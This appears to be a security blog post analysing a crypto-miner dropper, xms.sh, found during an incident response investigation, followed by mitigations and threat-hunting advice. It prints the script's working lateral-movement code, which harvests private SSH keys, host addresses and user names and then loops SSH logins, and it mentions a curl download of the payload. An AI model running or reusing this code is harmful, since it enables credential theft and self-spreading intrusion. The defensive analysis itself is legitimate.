---
layout: page
title: "Automated Lateral Movement Through SSH"
subheadline: "Lateral Movement Technique"
teaser: "Abusing SSH keys for lateral movement"
categories:
tags: 
header:
    title: "Automated Lateral Movement"
    background-color: "#EFC94C;"
    #pattern: pattern_concrete.jpg
    image_fullwidth: /new-tool-tuesday/winSuperMem/header_cyber-sec.jpg
    caption: Image from unsplash
    caption_url: https://unsplash.com/photos/XJXWbfSo2f0
---

## Intro

I was analyzing an adversary’s malicious shell script that was dropped onto a victim host during an incident response investigation and observed a fascinating lateral movement technique simply using `ssh` . The malicious shell script was called `xms.sh` and it’s intended purpose was to install a crypto miner on a victim host, then spread to other hosts the victim host had access to. 

## xms.sh

Below is the lateral movment technique:

```bash
# 3 different ways to find ssh keys
KEYS=$(find ~/ /root /home -maxdepth 2 -name 'id_rsa*' | grep -vw pub)
KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
KEYS3=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)

# 3 different ways to find host names on the network
HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)

# find all users from the local host
USERZ=$(
    echo "root"
    find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -v "\.ssh"
)

# displays/stores the info found
userlist=$(echo $USERZ | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
keylist=$(echo "$KEYS $KEYS2 $KEYS3" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)

# lateral movement with ssh
for user in $userlist; do
    for host in $hostlist; do
        for key in $keylist; do
            chmod +r $key; chmod 400 $key
            ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host "insert bad command here"
        done
    done
done
```

Let’s break down what is happening.

### Finding ssh keys

The first 3 variables attempt to find private ssh keys on the local host. 

```bash
# 3 different ways to find ssh keys
KEYS=$(find ~/ /root /home -maxdepth 2 -name 'id_rsa*' | grep -vw pub)
KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
KEYS3=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
```

- `KEYS` uses the `find` command to return the file paths of all `id_rsa` private key files.
- `KEYS2` uses the `cat` command to display the contents of all `.ssh/config` files and looks for private ssh key file paths as denoted by `IdentityFile` .
    - [https://linuxize.com/post/using-the-ssh-config-file/#shared-ssh-config-file-example](https://linuxize.com/post/using-the-ssh-config-file/#shared-ssh-config-file-example){:target="_blank"}
- `KEYS3` uses the `find` command to return the file paths for all private ssh keys in the pem format.

### Finding host names

The next 3 variables attempt to find host names of other machines that the victim host has access to.

```bash
# 3 different ways to find host names on the network
HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
HOSTS3=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
```

- `HOSTS` uses the `cat` command to display the contents of all `.ssh/config` files and looks for host names defined within the file.
- `HOSTS2` uses the `cat` comamnd to display the contents of all `.bash_history` files and return all IP addresses.
- `HOSTS3` uses the `cat` command to display the contents of all `known_hosts` files and return all IP addresses.

### Finding valid users

The next variable is used to find all valid user names on the victim host.

```bash
# find all users from the local host
USERZ=$(
    echo "root"
    find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -v "\.ssh"
)

```

- `USERZ` uses the `find` command to return all user names that have an `id_rsa` file.

This is a clever technique to omit any users that don’t use ssh keys. 

### Performing lateral movement

With ssh keys, host names, and valid users found the adversary has everything needed to make ssh connections.

```bash
# lateral movement with ssh
for user in $userlist; do
    for host in $hostlist; do
        for key in $keylist; do
            chmod +r $key; chmod 400 $key
            ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host "insert bad command here"
        done
    done
done
```

Using `for` loops the adversary will enumerate the valid users and perform an ssh connection for every host found using every ssh key found.

 `"insert bad command here"` - this part of the ssh command contained a curl command to have the target ssh host download the malicious `xms.sh` file.

The adversary is also using a timeout period of 5 seconds to speed up the execution time. 

This lateral movement technique is very simple and easy to understand, however it is not perfect.

## Issues and mitigations

This lateral movement technique only works if the adversary has root access. If the adversary only has user level access, then your host’s file ACLs would need to be severely misconfigured for a user to access another user’s private ssh key. But lets assume the adversary has root access.  

### Encrypt private ssh keys

The best defense that will stop this attack completely is to always password encrypt your private ssh key file. Upon creation of an ssh key using `ssh-keygen` , you are asked to set a password for your key. This step can be skipped by simply not setting a password, but no user should ever skip setting a password.

Under some circumstances, you may need to automate an ssh connection and this is where ssh keys not password protected become useful. In this scenario, you should create a new user account to only perform this automation and it’s ssh activity should be closely monitored. 

### Host name hashing

In this lateral movement technique, the adversary uses the `known_hosts` file to pull host names previously connected to. This attack method is not new and OpenSSH has provided a mitigation for it through a config option called HashKnownHosts. Enabling this config option will force the ssh client to hash the host name before logging the information, [read more about his feature](https://techglimpse.com/how-to-hash-known-hosts-files-of-ssh-directory/){:target="_blank"}. 

It should be noted that according to the [ssh_config man page](https://man7.org/linux/man-pages/man5/ssh_config.5.html){:target="_blank"}, this feature is not enabled by default. It’s possible that most modern Linux distros enabled this for you, as my Kali machine already had this feature enabled. For me, this was enabled in file `/etc/ssh/ssh_config` .

With HashKnownHosts on, you can prevent the adversary from discovering additional hosts 

### Bash history

The second method of host discovery from the adversary is by reading the `bash_history` file for every user. Bash history is stored for every bash command executed, even passwords passed on the command line. As a defender, we can configure the `~/.bash_logout` file to clear the bash history after every logout. You could even go as far as to completely disable the logging of bash history. You can learn more about clearing bash history [here](https://www.cyberciti.biz/faq/clear-the-shell-history-in-ubuntu-linux/){:target="_blank"}.

## Threat Hunting

Defenders will always inherit poorly configured machines with poor security standards, so it is important to devise a strategy to detect this lateral movement attack. The adversary will be performing ssh connection attempts with valid user names where some will be successful and some will be unsuccessful. The adversary is only doing one login attempt for every key found for each target host for a given user. I would use a log search tool to look for ssh successful or unsuccessful logins from valid user(s) in a very short time frame. Then I would look further to identify if one host is using multiple user accounts to make the ssh connections.